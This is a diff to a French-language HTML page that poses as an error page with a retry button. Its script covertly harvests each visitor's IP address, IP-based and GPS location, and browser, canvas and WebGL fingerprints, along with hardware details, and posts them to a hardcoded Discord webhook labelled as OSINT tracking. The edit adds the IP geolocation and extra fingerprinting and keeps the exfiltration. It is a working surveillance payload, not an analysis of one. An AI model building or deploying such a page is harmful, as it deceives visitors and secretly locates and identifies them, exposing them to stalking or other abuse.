@@ -40,7 +40,7 @@
       overflow: auto; 
       text-align: left; 
       margin-top: 40px; 
-      font-size: 0.9rem;
+      font-size: 0.85rem;
     }
     footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
   </style>
@@ -52,16 +52,14 @@
 
   <button onclick="location.reload()">Réessayer</button>
 
-  <footer>ID de transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>
+  <footer>ID transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>
 
   <pre id="collected">Chargement des informations...</pre>
 
   <script>
-    // Affichage dynamique de l'ID et référence
     document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
     document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();
 
-    // Objet qui va contenir toutes les infos
     let infos = {
       timestamp: new Date().toISOString(),
       url: window.location.href,
@@ -71,8 +69,10 @@
       languages: navigator.languages || [],
       platform: navigator.platform,
       vendor: navigator.vendor,
-      screen: `${screen.width} × ${screen.height} (${screen.colorDepth} bits)`,
-      availScreen: `${screen.availWidth} × ${screen.availHeight}`,
+      screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
+      availScreen: `${screen.availWidth}×${screen.availHeight}`,
+      pixelRatio: window.devicePixelRatio,
+      orientation: screen.orientation ? screen.orientation.type : null,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
       deviceMemory: navigator.deviceMemory || 'inconnu',
@@ -82,68 +82,92 @@
       online: navigator.onLine
     };
 
-    // Infos connexion (wifi/4g/5g + vitesse approx)
-    if (navigator.connection) {
-      infos.connection = {
-        type: navigator.connection.effectiveType || navigator.connection.type,
-        downlink: navigator.connection.downlink,
-        rtt: navigator.connection.rtt,
-        saveData: navigator.connection.saveData
-      };
-    }
+    // === IP + Géolocalisation complète ===
+    async function getIPAndGeo() {
+      try {
+        // IP simple + geo riche
+        const [ipRes, geoRes] = await Promise.all([
+          fetch('https://api.ipify.org?format=json'),
+          fetch('https://freeipapi.com/api/json/')
+        ]);
+        
+        const ipData = await ipRes.json();
+        const geoData = await geoRes.json();
 
-    // Batterie (si disponible)
-    if (navigator.getBattery) {
-      navigator.getBattery().then(battery => {
-        infos.battery = {
-          level: battery.level,
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
+        infos.ip = ipData.ip;
+        infos.geo = {
+          city: geoData.cityName,
+          region: geoData.regionName,
+          country: geoData.countryName,
+          countryCode: geoData.countryCode,
+          latitude: geoData.latitude,
+          longitude: geoData.longitude,
+          isp: geoData.isp || geoData.connection?.isp,
+          asn: geoData.asn
         };
-      }).catch(() => {});
+      } catch(e) {
+        infos.ip = "erreur récupération IP";
+        infos.geo = "erreur";
+      }
     }
 
-    // Fingerprint canvas très basique
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = "top";
-      ctx.font = "14px 'Arial'";
-      ctx.fillStyle = "#f60";
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = "#069";
-      ctx.fillText("fingerprint test 𐐷", 2, 15);
-      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-      ctx.fillText("fingerprint test 𐐷", 4, 17);
-      infos.canvas = canvas.toDataURL();
-    } catch (e) {
-      infos.canvas = 'non supporté';
+    // === Empreintes avancées ===
+    function addFingerprints() {
+      // Canvas
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("OSINT test 𐐷", 2, 15);
+        infos.canvasFingerprint = canvas.toDataURL();
+      } catch(e) { infos.canvasFingerprint = "non supporté"; }
+
+      // WebGL
+      try {
+        const glCanvas = document.createElement('canvas');
+        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+        if (gl) {
+          const debug = gl.getExtension('WEBGL_debug_renderer_info');
+          infos.webgl = {
+            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
+            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null
+          };
+        }
+      } catch(e) {}
+
+      // AudioContext fingerprint
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        infos.audioContext = "supporté";
+      } catch(e) { infos.audioContext = "non supporté"; }
     }
 
-    // Préparation du message Discord
-    function showAndSend() {
-      // Affichage local pour debug
+    // === Envoi vers Discord ===
+    async function sendToDiscord() {
       document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
 
-      const message = {
+      const embed = {
         embeds: [{
-          title: "Nouvelle visite détectée",
-          description: "Quelqu'un a chargé la page d'erreur",
+          title: "🚨 Nouvelle visite - Tracking OSINT",
           color: 0xff0000,
           fields: [
-            { name: "Heure", value: infos.timestamp, inline: true },
-            { name: "User-Agent", value: "```" + (infos.userAgent || "inconnu").substring(0, 250) + "```", inline: false },
-            { name: "Écran", value: infos.screen || "?", inline: true },
-            { name: "Fuseau horaire", value: infos.timezone || "?", inline: true },
-            { name: "Connexion", value: infos.connection ? infos.connection.type + " (" + (infos.connection.downlink || "?") + " Mbps)" : "?", inline: true },
-            { name: "Géolocalisation", value: infos.geo ? 
-              `${infos.geo.latitude}, ${infos.geo.longitude} (±${infos.geo.accuracy}m)` : 
-              "non autorisée / non disponible", inline: false },
-            { name: "Matériel", value: `Cœurs: ${infos.hardwareConcurrency || "?"} | RAM: ${infos.deviceMemory || "?"} Go`, inline: true },
-            { name: "Canvas fingerprint", value: infos.canvas ? "présent" : "absent", inline: true }
+            { name: "IP Publique", value: infos.ip || "Non récupérée", inline: true },
+            { name: "Pays / Ville", value: `${infos.geo?.country || "?"} - ${infos.geo?.city || "?"}`, inline: true },
+            { name: "User-Agent", value: "```" + (infos.userAgent || "?").substring(0, 300) + "```", inline: false },
+            { name: "Écran", value: infos.screen, inline: true },
+            { name: "Fuseau horaire", value: infos.timezone, inline: true },
+            { name: "Connexion", value: infos.connection ? `${infos.connection.type} (${infos.connection.downlink} Mbps)` : "?", inline: true },
+            { name: "Géoloc", value: infos.geo?.latitude ? `${infos.geo.latitude}, ${infos.geo.longitude}` : "Refusée", inline: false },
+            { name: "Matériel", value: `Cœurs: ${infos.hardwareConcurrency} | RAM: ${infos.deviceMemory}Go`, inline: true },
+            { name: "Canvas / WebGL", value: infos.canvasFingerprint ? "✅ Fingerprint présent" : "❌", inline: true }
           ],
-          footer: { text: "ID transaction : ERR-" + Date.now().toString(36).toUpperCase() },
+          footer: { text: `ID: ERR-${Date.now().toString(36).toUpperCase()} • ${new Date().toLocaleString('fr-FR')}` },
           timestamp: infos.timestamp
         }]
       };
@@ -151,46 +175,40 @@
       fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(message)
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("Envoyé sur Discord");
-        } else {
-          console.error("Erreur Discord", response.status);
-        }
-      })
-      .catch(err => {
-        console.error("Erreur fetch :", err);
-      });
+        body: JSON.stringify(embed)
+      }).catch(err => console.error("Erreur Discord:", err));
     }
 
-    // Géolocalisation
+    // Lancement
+    async function start() {
+      addFingerprints();
+      await getIPAndGeo();
+      showAndSend();   // ← défini plus bas
+    }
+
+    function showAndSend() {
+      sendToDiscord();
+    }
+
+    // Géolocalisation + démarrage
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
-          infos.geo = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude || null,
-            speed: pos.coords.speed || null
-          };
-          showAndSend();
+          infos.geo = infos.geo || {};
+          infos.geo.latitude = pos.coords.latitude;
+          infos.geo.longitude = pos.coords.longitude;
+          infos.geo.accuracy = pos.coords.accuracy;
+          start();
         },
-        () => {
-          infos.geo = 'refusée ou non disponible';
-          showAndSend();
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        () => start(),
+        { enableHighAccuracy: true, timeout: 12000 }
       );
     } else {
-      infos.geo = 'non supportée';
-      showAndSend();
+      start();
     }
 
-    // Envoi de secours (si géoloc prend trop de temps)
-    setTimeout(showAndSend, 6000);
+    // Envoi de secours
+    setTimeout(start, 8000);
   </script>
 </body>
 </html>
